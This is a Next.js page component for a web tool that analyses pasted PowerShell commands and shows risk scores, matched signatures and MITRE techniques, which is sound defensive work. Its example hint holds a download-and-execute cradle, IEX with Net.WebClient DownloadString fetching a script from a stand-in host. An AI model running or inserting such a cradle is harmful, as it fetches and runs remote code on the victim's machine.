"use client";
import { useSearchParams, useRouter } from "next/navigation";
import { useEffect, useState, useCallback, useRef } from "react";
import { useAuth } from "../contexts/AuthContext";
import { useAnalysisEvent } from "../contexts/AnalysisEventContext";
import { useRateLimit } from "../../hooks/useRateLimit";
import { useIpAddress } from "../../hooks/useIpAddress";
import SeverityLegend from "../components/SeverityLegend";
import AnalysisCard from "../components/AnalysisCard";
import SeverityBadge from "../components/SeverityBadge";
import IndicatorTable from "../components/IndicatorTable";
import ThemedButton from "../components/ThemedButton";
import LoadingSpinner from "../components/LoadingSpinner";
import AnalysisSkeleton from "../components/AnalysisSkeleton";
import CommandInput from "../components/CommandInput";
import { ErrorMessage, InfoMessage } from "../components/Messages";

  import { saveAnonymousAnalysis } from "../../utils/cookies";
import { getOrCreateSession, saveSessionFromBackend } from "../../utils/session";

// Score-based color system (5 bins from 1-10)
function getScoreColor(score) {
  if (score >= 10) return "border-red-600 text-red-600";           // Critical: 10.0+
  if (score >= 8) return "border-orange-400 text-orange-400";      // High: 8.0+
  if (score >= 5) return "border-yellow-400 text-yellow-400";      // Medium: 5.0+
  if (score >= 2) return "border-green-400 text-green-400";        // Low: 2.0+
  return "border-blue-400 text-blue-400";                          // Informational: 1.0
}

function getScoreLabel(score) {
  if (score >= 10) return "CRITICAL";
  if (score >= 8) return "HIGH";
  if (score >= 5) return "MEDIUM";
  if (score >= 2) return "LOW";
  return "INFORMATIONAL";
}

export default function AnalysisPage() {
  const params = useSearchParams();
  const router = useRouter();
  const { user, isAuthenticated } = useAuth();
  const { notifyNewAnalysis } = useAnalysisEvent();
  const { ipAddress, ipLocation, loading: ipLoading, error: ipError } = useIpAddress();
  const { 
    rateLimitInfo, 
    handleRateLimitResponse, 
    reset: resetRateLimit,
    timeLeft,
    isTimerActive,
    formatTime
  } = useRateLimit();
  const [result, setResult] = useState(null);
  const [cmd, setCmd] = useState("");
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [newCommand, setNewCommand] = useState("");
  const analysisExecutedRef = useRef(false);



  // Remover verificação de autenticação - permitir análises anônimas
  // useEffect(() => {
  //   if (!isAuthenticated()) {
  //     router.push('/landing');
  //   }
  // }, [isAuthenticated, router]);

  // Função de análise local removida - agora respeitamos sempre o rate limiting da API

  const performAnalysis = async (command, providedIpAddress, providedIpLocation) => {
    // Usar IP e localização do hook se não fornecidos
    const finalIpAddress = providedIpAddress || ipAddress;
    const finalIpLocation = providedIpLocation || ipLocation;
    try {
      setLoading(true);
      setError("");
      
      // Garantir que o skeleton apareça por pelo menos 800ms para UX
      const minDelay = new Promise(resolve => setTimeout(resolve, 800));
      
      // Timeout de 15 segundos para análise
      const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new Error('Analysis timeout - taking too long')), 15000)
      );
      
      // Obter ou criar sessão anônima
      const sessionId = getOrCreateSession();
      
      // Preparar dados para a API
      const requestData = { 
        command,
        user_id: user?.id || null,  // Enviar null se não logado, não UUID padrão
        ip_address: finalIpAddress,
        country: finalIpLocation?.country,
        city: finalIpLocation?.city,
        region: finalIpLocation?.region,
        timezone: finalIpLocation?.timezone,
        user_agent: navigator.userAgent,
        search_type: "WEB",  // Sempre WEB quando vindo do frontend
        session_id: sessionId
      };



      // Chamar a API Python usando makeAuthenticatedRequest
      const { makeAuthenticatedRequest } = await import('../../lib/api');
      const analysisPromise = makeAuthenticatedRequest('/analyze-pcre2', {
        method: 'POST',
        body: JSON.stringify(requestData)
      }).then(async response => {
        const data = await response.json();
        
        // Verificar se precisa de rate limiting
        const needsHandling = handleRateLimitResponse(response, data);
        
        if (needsHandling) {
          throw new Error('Rate limit excedido');
        }
        
        if (!response.ok) {
          throw new Error(data.error || `HTTP error! status: ${response.status}`);
        }
        
        return data;
      }).catch(error => {
        if (error.message === 'Rate limit excedido') {
          throw error;
        }
        throw new Error(`Erro da API: ${error.message}`);
      });
      
      // Executar análise e delay mínimo em paralelo
      const [response] = await Promise.all([
        Promise.race([analysisPromise, timeoutPromise]),
        minDelay
      ]);
      
      if (response.success) {
        const analysisData = response.analysis;
        
        // Salvar session_id retornado pelo backend
        if (response.session_id && !user?.id) {
          saveSessionFromBackend(response.session_id);
        }
        
        // Salvar análise anônima em cookies se não estiver logado (ANTES do redirecionamento)
        if (!user?.id) {
          try {
            saveAnonymousAnalysis({
              command: command,
              score: analysisData.risk_score,
              severity: analysisData.is_malicious ? "malicious" : "safe",
              signatures: analysisData.signatures_detected || [],
              cmdlets_detected: analysisData.cmdlets_detected || [],
              analysis_id: response.analysis_id
            });
          } catch (error) {
            console.error('❌ [ANALYSIS PAGE] Erro ao salvar análise anônima:', error);
          }
        }
        
        // Se temos um analysis_id, redirecionar para a página específica da análise
        if (response.analysis_id) {
          // Notificar que uma nova análise foi feita
          notifyNewAnalysis();
          
          // Redirecionar imediatamente sem delay para evitar stutter
          router.push(`/analysis/${response.analysis_id}`);
          return; // Sair da função imediatamente
        }
        
        const analysisResult = {
          score: analysisData.risk_score,
          severity: analysisData.is_malicious ? "malicious" : "safe",
          signatures: (analysisData.signatures_detected || []).sort((a, b) => (b.total_score || 0) - (a.total_score || 0)),
          decoded: analysisData.decoded_command,
          indicators: analysisData.analysis_details?.indicators || [],
          details: analysisData.analysis_details?.recommendations?.join(", ") || "",
          tactics: analysisData.tactics || [],
          techniques: analysisData.techniques || [],
          analysisId: response.analysis_id // Capturar o ID da análise
        };
        
        setResult(analysisResult);
      } else {
        throw new Error(response.error || 'Analysis failed');
      }
    } catch (err) {
      // Se é erro de rate limit, não prosseguir - apenas mostrar o erro
      if (err.message === 'Rate limit excedido') {
        setLoading(false);
        return; // O rate limiting já foi tratado pelo handleRateLimitResponse
      }
      
      // Para outros erros da API, mostrar o erro sem fallback
      setError(err.message);
      setResult(null);
    } finally {
      setLoading(false);
    }
  };

  // Análise otimizada usando backend Python
  useEffect(() => {
    
    const command = params.get("cmd") || "";
    const ipAddress = params.get("ip") || null;
    const country = params.get("country") || null;
    const city = params.get("city") || null;
    const region = params.get("region") || null;
    const timezone = params.get("timezone") || null;
    
    setCmd(command);
    setNewCommand(command);
    
    if (command.trim() && !analysisExecutedRef.current) {
      analysisExecutedRef.current = true; // Marcar como executada
      
      // Criar objeto de localização
      const ipLocation = {
        country,
        city,
        region,
        timezone
      };
      
      performAnalysis(command);
    } else if (!command.trim()) {
      setLoading(false);
      setResult({
        score: 0,
        severity: "safe",
        signatures: [],
        decoded: null,
        indicators: [],
        details: "No command to analyze"
      });
    }
  }, [params, performAnalysis]);
  
  // Calculate total risk score from result - soma de TUDO (sem remover duplicatas do total)
  const totalScore = result ? result.score : 0;
  
  // Handle new command analysis
  const handleNewAnalysis = async () => {
    if (newCommand.trim()) {
      // Verificar se já atingiu rate limit antes de prosseguir
      if (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit) {
        setError("Rate limit atingido. Aguarde o timer ou resolva o captcha.");
        return;
      }
      
      analysisExecutedRef.current = false; // Resetar flag para permitir nova análise
      
      // Limpar apenas o erro, mas manter o resultado atual para evitar flick
      setError("");
      
      // Executar nova análise diretamente (IP será obtido do hook automaticamente)
      await performAnalysis(newCommand.trim());
      
      // Limpar o campo de input apenas se a análise foi bem-sucedida
      setNewCommand("");
    }
  };

  if (loading) {
    return <AnalysisSkeleton />;
  }

  return (
    <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 md:p-8">
             <h1 className="text-2xl sm:text-3xl md:text-4xl font-mono font-bold mb-6 sm:mb-8 text-center" style={{color: 'var(--accent)'}}>
         Evaluation Results
       </h1>

    
      <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
        <div className="flex flex-col sm:flex-row gap-3 items-start">
          <div className="flex-1 w-full">
            <CommandInput
              value={newCommand}
              onChange={(e) => setNewCommand(e.target.value)}
              onSubmit={handleNewAnalysis}
              placeholder="Type or paste a PS payload..."
              disabled={loading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
            />
          </div>
          <ThemedButton
            onClick={handleNewAnalysis}
            disabled={!newCommand.trim() || loading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
            className="flex-shrink-0"
            loading={loading}
          >
            {loading ? 'Analyzing...' : 'Evaluate'}
          </ThemedButton>
        </div>
        <InfoMessage 
          message={!error && newCommand.trim() === "" ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
          clickable={!error && newCommand.trim() === ""}
          onClick={() => setNewCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
        />
      </div>

      {rateLimitInfo && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mt-4 mb-6 rounded-lg border-2 bg-black/80 border-green-500/30 hover:border-green-500/50 transition-all hover:shadow-[0_0_30px_rgba(34,197,94,0.3)] cursor-pointer">
          <div className="p-4">
            <div className="text-center mb-4">
              <div className="font-mono text-sm mb-2" style={{color: 'var(--muted-foreground)'}}>
                <strong>Notice:</strong> You have made <span style={{color: 'var(--accent)'}}>{rateLimitInfo.current_count}</span> of <span style={{color: 'var(--accent)'}}>{rateLimitInfo.limit}</span> allowed searches in {rateLimitInfo.window_seconds} seconds.
              </div>
            </div>

            {rateLimitInfo.current_count >= rateLimitInfo.limit && (
              <div>
                <div className="text-center mb-6">
                  <div className="inline-flex items-center gap-3 px-4 py-2 rounded-full border-2 border-red-500 bg-black/80 border-green-500/30 hover:border-green-500/50 transition-all hover:shadow-[0_0_15px_rgba(34,197,94,0.3)] cursor-pointer">
                    <span className="text-2xl">🚫</span>
                    <span className="font-mono font-bold text-red-500">Rate limit reached</span>
                  </div>
                </div>
                
                {isTimerActive && timeLeft > 0 && (
                  <div className="text-center">
                    <div className="inline-block p-6 rounded-xl border-2 bg-black/80 border-green-500/30 hover:border-green-500/50 transition-all hover:shadow-[0_0_30px_rgba(34,197,94,0.3)] cursor-pointer">
                      <div className="text-4xl mb-3">⏰</div>
                      
                      <div className="font-mono font-bold text-xl mb-3" style={{color: 'var(--accent)'}}>
                        Wait for reset
                      </div>
                      
                      <div className="font-mono text-3xl font-bold mb-4 px-4 py-2 rounded-lg border bg-black/80 border-green-500/30 hover:border-green-500/50 transition-all hover:shadow-[0_0_15px_rgba(34,197,94,0.3)] cursor-pointer" style={{
                        color: 'var(--accent)'
                      }}>
                        {formatTime}
                      </div>
                      
                      <div className="font-mono text-sm max-w-xs mx-auto" style={{color: 'var(--muted-foreground)'}}>
                        You can make new searches when the timer reaches zero
                      </div>
                      
                      <div className="mt-4 w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
                        <div 
                          className="h-2 rounded-full transition-all duration-1000" 
                          style={{
                            backgroundColor: 'var(--accent)',
                            width: `${Math.max(0, (timeLeft / 60) * 100)}%`
                          }}
                        ></div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}


     
      {result && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div 
            className="p-4 sm:p-6 rounded-lg border-2 border-green-400 text-center relative bg-black/80 border-green-500/30 hover:border-green-500/50 transition-all hover:shadow-[0_0_30px_rgba(34,197,94,0.3)] cursor-pointer"
          >
            <div className="absolute top-4 right-4">
              <SeverityLegend />
            </div>
            
            <div className="text-lg sm:text-xl font-mono font-bold mb-3 text-green-400">
              Cumulative Base Score
            </div>
            <div className="text-4xl sm:text-5xl font-mono font-bold mb-3 text-white">
              {totalScore.toFixed(1)}
            </div>
            <div className="text-xs sm:text-sm font-mono text-green-400 mb-2">
              {totalScore === 0 ? "No Malicious Indicators Detected" : "Cumulative score from all patterns"}
            </div>
            {result.signatures && result.signatures.length > 0 && (
              <div className="text-xs font-mono text-gray-400  pt-3 mt-3">
                {(() => {
                  const securitySigs = result.signatures.filter(sig => 
                    !sig.name.includes('(') || sig.score >= 4.0 || !sig.techniques?.includes('T1059.001') || sig.tactics?.length > 1
                  );
                  const allCmdlets = result.signatures.filter(sig => 
                    sig.name.includes('(') && sig.score < 4.0 && sig.techniques?.includes('T1059.001') && sig.tactics?.length <= 1
                  );
                  
                  const securityScore = securitySigs.reduce((sum, sig) => sum + (sig.total_score || sig.score || 0), 0);
                  const allCmdletScore = allCmdlets.reduce((sum, sig) => sum + (sig.total_score || sig.score || 0), 0);
                  
                  return (
                    <>
                      {allCmdletScore > 0 && <div>PowerShell Cmdlets: {allCmdletScore.toFixed(1)}</div>}
                    </>
                  );
                })()}
              </div>
            )}
          </div>
        </div>
      )}
       {result && result.signatures && result.signatures.length > 0 && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          {(() => {
            const realSignatures = result.signatures.filter(sig => 
              !sig.name.includes('(') || 
              sig.score >= 4.0 || 
              !sig.techniques?.includes('T1059.001') || 
              sig.tactics?.length > 1 
            );
            
            const importantCmdletNames = realSignatures
              .filter(sig => sig.name.includes('('))
              .map(sig => {
                const match = sig.name.match(/\((.*?)\)$/);
                return match ? match[1] : null;
              })
              .filter(Boolean);
            
            const basicCmdlets = result.signatures.filter(sig => 
              sig.name.includes('(') &&
              sig.score < 4.0 && 
              sig.techniques?.includes('T1059.001') && 
              sig.tactics?.length <= 1
              
            );

            return (
              <>
                {realSignatures.length > 0 && (
                  <div className="mb-6">
                                         <h2 className="text-lg sm:text-xl font-mono font-bold mb-4" style={{color: 'var(--foreground)'}}>
                       Indicators Breakdown
                     </h2>
                    <div className="space-y-4">
                      {realSignatures.map((signature, index) => (
                        <AnalysisCard
                          key={`real-${index}`}
                          title={signature.name || 'Unknown Pattern'}
                          description={signature.description || `Pattern detected: ${signature.pattern || 'No description available'}`}
                          severity={signature.severity || 'unknown'}
                          score={signature.total_score || signature.score || 0}
                          pattern={signature.pattern || 'No pattern specified'}
                          matched_text={signature.matched_text || signature.matchedText || ''}
                          matched_command={signature.matched_command || signature.matchedCommand || ''}
                          keywords={signature.pattern || signature.keyword || ''}
                          tactic={signature.tactics || signature.tactic || []}
                          technique={signature.techniques || signature.technique || []}
                          reference={signature.reference || ''}
                          link={signature.link || null}
                          matchesInfo={{
                            matchesFound: signature.matches_found || 1,
                            baseScore: signature.base_score || signature.score || 0,
                            totalScore: signature.total_score || signature.score || 0,
                            maxMatchAllowed: signature.max_match_allowed || signature.max_match || 1,
                            matchesDetails: signature.matches_details || signature.matchesDetails || []
                          }}
                        />
                      ))}
                    </div>
                  </div>
                )}

                  {basicCmdlets.length > 0 && (
                    <div className="mb-6">
                      <h3 className="text-base font-mono font-bold mb-3" style={{color: 'var(--muted-foreground)'}}>
                        PowerShell Cmdlets ({basicCmdlets.length})
                      </h3>
                    <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
                      {basicCmdlets.map((cmdlet, index) => (
                        <div 
                          key={`cmdlet-${index}`}
                          className="border rounded p-3 text-center bg-black/80 border-green-500/30 hover:border-green-500/50 transition-all hover:shadow-[0_0_15px_rgba(34,197,94,0.3)] cursor-pointer"
                        >
                          <div className="font-mono text-sm font-bold mb-1" style={{color: 'var(--foreground)'}}>
                            {cmdlet.name}
                          </div>
                          <div className="text-xs font-mono" style={{color: 'var(--muted-foreground)'}}>
                            Score: {cmdlet.total_score || cmdlet.score} • Basic PowerShell
                          </div>
                          {cmdlet.matches_found > 1 && (
                            <div className="text-xs font-mono mt-1" style={{color: 'var(--accent)'}}>
                              {cmdlet.matches_found} matches • Base: {cmdlet.base_score || cmdlet.score}
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </>
            );
          })()}
        </div>
      )}

      {result && (!result.signatures || result.signatures.length === 0) && totalScore === 0 && (
               <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
         <div className="border rounded-lg p-6 text-center bg-black/80 border-green-500/30 hover:border-green-500/50 transition-all hover:shadow-[0_0_30px_rgba(34,197,94,0.3)] cursor-pointer">
           <h2 className="text-lg sm:text-xl font-mono font-bold mb-2" style={{color: 'var(--foreground)'}}>
             Zero indicators found
           </h2>
           <p className="text-sm sm:text-base font-mono" style={{color: 'var(--muted-foreground)'}}>
             This command does not seem to match any indicator.
           </p>
         </div>
       </div>
      )}

      {result && result.signatures && result.signatures.length > 0 && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-green-500/30 hover:border-green-500/50 transition-all hover:shadow-[0_0_30px_rgba(34,197,94,0.3)] cursor-pointer">
            <div className="font-mono text-sm" style={{color: 'var(--muted-foreground)'}}>
              Matched indicators are not inherently suspicious but highlight traces that may require closer examination. For interpretation details, check the link below:
              <br /><br />
              <span style={{color: 'var(--primary-purple)'}}>&lt;wiki link to be provided later&gt;</span>
            </div>
          </div>
        </div>
      )}

      {result && result.decoded && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8 border rounded-lg p-4 bg-black/80 border-green-500/30 hover:border-green-500/50 transition-all hover:shadow-[0_0_30px_rgba(34,197,94,0.3)] cursor-pointer">
          <h2 className="text-lg font-mono font-bold mb-3" style={{color: 'var(--foreground)'}}>
            Decoded Content
          </h2>
          <div className="font-mono text-sm break-all p-3 rounded bg-black/80 border border-green-500/30 hover:border-green-500/50 transition-all hover:shadow-[0_0_15px_rgba(34,197,94,0.3)] cursor-pointer" style={{color: 'var(--foreground)'}}>
            {result.decoded}
          </div>
        </div>
      )}
      {error && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8 border rounded-lg p-4 border-red-500 bg-black/80 border-green-500/30 hover:border-green-500/50 transition-all hover:shadow-[0_0_30px_rgba(34,197,94,0.3)] cursor-pointer">
          <h2 className="text-lg font-mono font-bold mb-3 text-red-500">
            Error
          </h2>
          <div className="font-mono text-sm text-red-400">
            {error}
          </div>
        </div>
      )}

     

      <div className="flex flex-col sm:flex-row gap-3 justify-center mb-8">
        <ThemedButton onClick={() => router.push('/')}>
          Evaluate Another Command
        </ThemedButton>
        <ThemedButton
          variant="outline"
          onClick={() => {
            // Se temos um resultado com ID, usar o link limpo
            const baseUrl = window.location.origin;
            const shareUrl = result?.analysisId 
              ? `${baseUrl}/analysis/${result.analysisId}`
              : window.location.href; // Fallback para URL atual se não tiver ID
            navigator.clipboard.writeText(shareUrl);
          }}
        >
          Copy sharable link
        </ThemedButton>
      </div>


    </div>
  );
}
